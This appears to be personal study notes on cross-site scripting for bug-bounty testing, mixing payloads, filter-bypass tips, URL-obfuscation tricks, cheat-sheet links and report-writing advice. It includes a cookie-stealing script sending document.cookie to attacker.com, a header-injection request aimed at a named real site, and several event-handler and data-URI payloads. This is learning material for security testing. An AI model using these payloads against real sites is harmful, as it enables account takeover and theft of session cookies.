# Further Learning
> https://aszx87410.github.io/beyond-xss/en/


## Account Take Over
> https://xss.example.com/?input=<script>document.location="http://attacker.com/index.php?cookie=" + document.cookie;</script>

# Identifying XSS
1. Look for input fields
2. Type in the payload. Simple payloads prolly won't work bc of sanitation
3. More than <script> tags
- test on HTML tag attributes like onload, onclick, onerror
- HTTP URL schemes like javascript: and data:
- with data: you can pass a base64 encode of the script payload
- like data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
- or just pass the script 

# XSS Validation
## Client-Side and Server side
A Web app can use both, determine 
where the validations and sanitation are applied
and mutate the payload accordingly

Read Open Source Frameworks for static analysis
of the XSS Prevention implementations

Reading source code can help you detect 
if there is a possibility of XSS like DOM-XSS

Look at cookie implementation to see how you can
escalate an XSS by stealing user cookies 
check httponly flag

> GET /member/home/index.htm/x.jpeg?t=2021111121 HTTP/2
```
Host: www.glassdoor.com
X-Forwarded-For: xss 
X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`// 
X-Forwarded-For: > 
Cookie: gdId=xss</script%20
```

# Cheatsheet
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet

Everything about web application firewalls (WAFs) from a security perspective. 🔥
https://github.com/0xInfection/Awesome-WAF

Payloads All The Things
A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques !
https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/#other-ways

https://html5sec.org/

polyglot
https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/

IoT
https://github.com/OWASP/IoTGoat/

https://cheatsheetseries.owasp.org/index.html

XSS Filter Evasion Cheat Sheet
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

On ruling out false XSS with innerHTML 
TIP: Scan source code for how innerHTML is used. 

HTML specifies that a <script> tag inserted with innerHTML should not execute.
https://www.w3.org/TR/2008/WD-html5-20080610/dom.html#innerhtml0

However, there are ways to execute JavaScript without using <script> elements, 
so there is still a security risk whenever you use innerHTML to set strings 
over which you have no control. For example:
const name = "<img src='x' onerror='alert(1)'>";
el.innerHTML = name; // shows the alert

Test image uploads with image URL in URL

====================
 On report writing |
====================
For that reason, it is recommended that instead of innerHTML you use:
Node.textContent when inserting plain text, as this inserts it as raw text rather than parsing it as HTML.
https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations

XSS’s impact depends on a variety of factors: whether it’s stored or
reflected, whether cookies are accessible, where the payload executes etc
Despite the potential damage XSS can cause on a site, fixing XSS vulnerabilities is often easy

When they say they have fixed your issue, please test again to confirm that it has really be fixed. 
if it isn't fixed properly, point out to them to make a proper complete fix.

XSS Polymorphism 
- Changing your payload based of sanitation information received from the target
- if your payload is getting sanitized, 
how do you by pass the sanitization?
Under the sanitization and craft a clever payload 
that passes the sanitation
- maybe pass malformed html/js payloads
- see https://klikki.fi/yahoo-mail-stored-xss/
- see https://mahmoudsec.blogspot.com/2015/09/how-i-found-xss-vulnerability-in-google.html


There are HTML attributes that executes javascript
For example, these HTML
Event Attributes that execute JavaScript being outside a <script> tag:
<b onmouseover=alert('XSS')>Click Me!</b>
<svg onload=alert(1)>
<body onload="alert('XSS')">
<img src="http://test.cyberspacekittens.com"
onerror=alert(document.cookie);>

See https://html5sec.org/
Turning HTML Injection into XSS
<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>


BROWSERS HACKERS HANDBOOK
URL OBFUSCATION
The following are ways in which to obfuscate a URL:
■ URL Shorteners
■ URL Redirectors
■ URL- or ASCII-encoded characters
■ Adding a number of extra, irrelevant query parameters with the malicious
payload either in the middle or toward the end
■ Using the @ symbol within a URL to add fake domain content
■ Converting the hostname into an integer, for example http://3409677458
